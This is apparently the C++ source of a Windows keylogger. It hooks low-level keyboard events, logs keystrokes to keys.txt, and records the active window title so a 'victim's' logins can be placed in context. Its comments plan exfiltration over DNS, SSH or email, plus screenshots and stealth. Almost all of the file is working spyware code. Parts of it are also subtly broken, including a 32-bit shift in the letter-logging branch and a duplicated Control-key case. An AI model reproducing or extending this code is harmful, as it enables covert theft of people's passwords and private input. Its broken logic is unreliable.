/* References:
 - Catch Tests: https://github.com/philsquared/Catch
 - Better WinAPI reference: https://www.unknowncheats.me/forum/c-and-c/83707-setwindowshookex-example.html
*/

/* Features:
- Log keys to a file called "keys.txt"
- Windows API to hook keyboard events
- Detect when a victim changes windows
- Write the new window title to the log file, 
	help to give context to where a victim was typing what (login page vs word document)
*/

/* NOTES:
Currently dead simple. Has some bugs and probably some missing keys in the case table.
Areas for improvement:
 - Grab screenshot of areas around cursor when clicking
 - Exfiltrate data over DNS, SSH, email, something like that
 - Encrypt data before it is sent out/logged
 - Don't open the file a billion times per second to read/write
 - Obviously we don't have any kind of stealth in here yet. The victim can see the window open in the background.
	This is just for testing.

 - Check out other things we can do with wParam
 https://stackoverflow.com/questions/342167/keyboard-hook-not-getting-lower-or-upper-case-characters

*/

#include "stdafx.h"
#include "public.h"
// Necessary for our unit tests. We define our own entry point into test cases main method
#define CATCH_CONFIG_RUNNER
#include "catch.hpp"

// Global handle to the keyboard hook
HHOOK _hook;

// Data structure for the data received by hook
KBDLLHOOKSTRUCT kbdStruct;

// Previous window title
char prevWindow[MAX_PATH];
// Current window title
char currentWindow[MAX_PATH];


int main(int argc, char* argv[])
{
	// Currently need a better way to integrate tests. Probably in a separate project
	// in this solution. Unit tests are place holders atm anyway. They all pass because
	// they just assert 1==1 which always passes
	// New Catch sessions for running our tests in test.cpp
	//Catch::Session session; // There must be exactly one instance
	//int returnCode = session.applyCommandLine(argc, argv);
	//if (returnCode != 0) // Indicates a command line error
	//return returnCode;

	// Run the unit tests
	//int numFailed = session.run();

	/* Note that on unices only the lower 8 bits are usually used, clamping
	the return value to 255 prevents false negative when some multiple
	of 256 tests has failed */

	//return (numFailed < 0xff ? numFailed : 0xff);

	// Get starting window title, set prevWindow to current window
	GetWindowTextA(GetForegroundWindow(), currentWindow, sizeof(currentWindow));
	strcpy(prevWindow, currentWindow);

	// Enable hook
	SetHook();

	// Use for testing so window stays open
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{

	}

}
// Callback function for kb. Called when a key is pressed
LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam) {
	// If it's a valid nCode
	if (nCode >= 0) {
		// If we detect a key press
		if (wParam == WM_KEYDOWN) {
			// Dereference into our struct and grab lparam in it.
			// it's the pointer to the data from the keyboard callback
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			// char array to store the name of the window in which we captured a key
			// Grab the name of the current window, store it in cWindow
			GetWindowTextA(GetForegroundWindow(), currentWindow, sizeof(currentWindow));
			Save(kbdStruct.vkCode, "keys.txt", currentWindow);
		}
	}
	 
	// Call the next hook in the chain
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() {
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL sets a low level keyboard hook.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack, NULL, 0))) {
		// Show error with "Error" icon. . . Hook failed to set for some reason
		MessageBox(NULL, _T("Hook not set."), _T("Error"), MB_ICONERROR);
	}
}

void ReleaseHook() {
	// Free the hook
	UnhookWindowsHookEx(_hook);
}


// Save takes in a vkCode (see:  https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx) and a pointer to file
// Then makes decisions on what to do based on what was pressed
// Here we define our save function that we declared before.
int Save(DWORD vkCode, char *file, char* cWindow)   
{
	// Note this is really heavy on file I/O
	// Need to move this out of here at some point
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	// If the user switched tabs (window title)
	if (strcmp(prevWindow, currentWindow) != 0) {
		// Set that to be the new last known window, then write the change to the keylogger
		strcpy(prevWindow, currentWindow);
		fprintf(OUTPUT_FILE, "\r\nChanged Window: \t%s\r\n", currentWindow);
	}
	
	if (vkCode == VK_LBUTTON)
		// TODO: Grab screen grab around current cursor 
		// grab current mouse position
		// take screencap of 512x512 centered around mouse pos
		fprintf(OUTPUT_FILE, "%s", "[LMB]");
	else if (vkCode == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (vkCode == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (vkCode == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (vkCode == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (vkCode == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (vkCode == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (vkCode == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (vkCode == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (vkCode == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (vkCode == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (vkCode == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (vkCode == VK_RETURN)
		// Carriage return line feed when enter is pressed
		fprintf(OUTPUT_FILE, "%s", "\r\n");
	else if (vkCode == VK_OEM_PERIOD)
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (vkCode == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CTRL]");
	else if (vkCode == VK_MENU)
		fprintf(OUTPUT_FILE, "%s", "[ALT]");
	// TODO: Detect whether shift/caps lock is currently pressed so we can
	// tell the difference between upper and lower case letters in our log file
	else if (vkCode >= 0x41 && vkCode <= 0x5A) {
		// Some wizardry here:
		// Grab the last byte from the DWORD: shift right and mask it with 0xff
		// This contains our ASCII char code for the key press 0x41(65) = A 0x5A(90) = Z
		fprintf(OUTPUT_FILE, "%c", (char)((vkCode >> (8 * 4)) & 0xff));
	}

	fclose(OUTPUT_FILE);
	return 0;
}



